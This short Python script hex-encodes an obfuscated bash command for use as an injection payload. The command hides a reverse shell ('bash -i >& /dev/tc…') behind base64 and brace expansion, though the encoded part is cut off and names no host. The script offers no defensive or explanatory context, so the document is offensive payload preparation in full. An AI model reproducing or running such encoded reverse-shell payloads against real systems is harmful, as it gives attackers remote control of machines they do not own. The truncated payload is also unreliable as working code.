# coding: utf-8

result = ""
target = 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3Rjc}|{base64,-d}|{bash,-i}'
for x in target:
    result += hex(ord(x)) + ","
print(result.rstrip(','))